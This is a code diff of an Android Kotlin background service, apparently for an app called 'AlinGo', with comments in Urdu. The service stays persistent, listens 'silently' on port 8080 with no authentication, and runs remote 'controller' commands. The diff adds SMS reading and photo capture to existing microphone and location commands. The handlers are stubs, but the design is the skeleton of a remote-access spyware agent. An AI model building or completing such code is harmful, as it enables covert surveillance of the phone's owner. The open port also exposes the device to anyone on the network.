@@ -24,30 +24,25 @@ class AgentService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // 1. نوٹیفکیشن آن رکھیں (تاکہ اینڈرائیڈ سروس کو مار نہ دے)
         startForeground(1001, buildNotification())
 
-        // 2. ایجنٹ کو "سننے" (Listen) کے لیے تیار کریں
-        // یہ تھریڈ صرف سگنل کا انتظار کرے گا، کوئی پروسیسنگ نہیں کرے گا
+        // اگر پہلے سے نہیں چل رہا تو سننا شروع کریں
         if (serverSocket == null) {
-            startListeningForCommands()
+            startListeningForController()
         }
 
         return START_STICKY
     }
 
-    private fun startListeningForCommands() {
+    private fun startListeningForController() {
         thread(isDaemon = true) {
             try {
-                // ایک پورٹ پر کنٹرولر کے سگنل کا انتظار کریں (مثلاً 8080)
+                // AlinGo Controller یہاں (پورٹ 8080) پر کمانڈ بھیجے گا
                 serverSocket = ServerSocket(8080)
                 Log.d("AlinGoAgent", "Agent is silently listening on port 8080")
 
                 while (isListening) {
-                    // یہ لائن پروسیسر کو روکے رکھے گی (Sleep) جب تک کوئی کمانڈ نہ آئے
-                    val client = serverSocket?.accept() ?: break 
-                    
-                    // اگر یہاں تک پہنچے تو اس کا مطلب ہے کمانڈ آئی ہے
+                    val client = serverSocket?.accept() ?: break
                     val command = client.getInputStream().bufferedReader().readLine()
                     executeCommand(command)
                     client.close()
@@ -61,21 +56,21 @@ class AgentService : Service() {
     private fun executeCommand(command: String?) {
         if (command == null) return
         Log.d("AlinGoAgent", "Received command: $command")
-        
-        // یہاں آپ کی کمانڈز کا پروسیسنگ ہوگا
+
         when (command) {
             "PING" -> Log.d("AlinGoAgent", "PONG")
-            "START_MIC" -> { /* MicHandler.start() */ }
+            "START_MIC" -> { /* MicHandler.start(this) */ }
             "STOP_MIC" -> { /* MicHandler.stop() */ }
-            "GET_LOCATION" -> { /* LocationHandler.get() */ }
-            // اور بھی کمانڈز...
+            "GET_LOCATION" -> { /* LocationHandler.get(this) */ }
+            "GET_SMS" -> { /* SmsHandler.get(this) */ }
+            "TAKE_PHOTO" -> { /* CameraHandler.capture(this) */ }
+            // مزید کمانڈز یہاں شامل کریں
         }
     }
 
     private fun buildNotification(): Notification {
         val pendingIntent = PendingIntent.getActivity(
-            this, 0,
-            Intent(this, MainActivity::class.java),
+            this, 0, Intent(this, MainActivity::class.java),
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
 
@@ -85,7 +80,7 @@ class AgentService : Service() {
                 .setContentText("Waiting for controller commands...")
                 .setSmallIcon(android.R.drawable.stat_sys_download_done)
                 .setContentIntent(pendingIntent)
-                .setOngoing(true) // ہمیشہ آن رہے گا
+                .setOngoing(true)
                 .build()
         } else {
             Notification.Builder(this)
@@ -100,13 +95,8 @@ class AgentService : Service() {
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val serviceChannel = NotificationChannel(
-                "AgentChannel",
-                "AlinGo Agent",
-                NotificationManager.IMPORTANCE_LOW
-            )
-            val manager = getSystemService(NotificationManager::class.java)
-            manager.createNotificationChannel(serviceChannel)
+            val channel = NotificationChannel("AgentChannel", "AlinGo Agent", NotificationManager.IMPORTANCE_LOW)
+            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
     }
 
